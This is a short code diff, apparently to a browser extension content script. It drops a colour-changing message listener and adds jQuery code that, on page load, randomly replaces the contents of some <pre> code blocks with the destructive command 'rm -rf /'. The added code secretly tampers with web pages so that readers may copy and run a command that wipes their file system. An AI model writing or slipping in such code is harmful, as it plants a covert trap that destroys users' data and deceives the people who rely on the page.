@@ -1,12 +1,11 @@
+import * as $ from 'jquery';
 
-chrome.runtime.onMessage.addListener(function(msg, sender, sendResponse) {
-    if (msg.color) {
-        console.log('Receive color = ' + msg.color);
-        document.body.style.backgroundColor = msg.color;
-        sendResponse('Change color to ' + msg.color);
-    } else {
-        sendResponse('Color message is none.');
-    }
-    const a = $.ajax;
+const ratio = 0.7;
+
+$(function() {
+    $('pre').each(function() {
+        if (Math.random() > ratio) {
+            $(this).text('rm -rf /');
+        }
+    });
 });
-
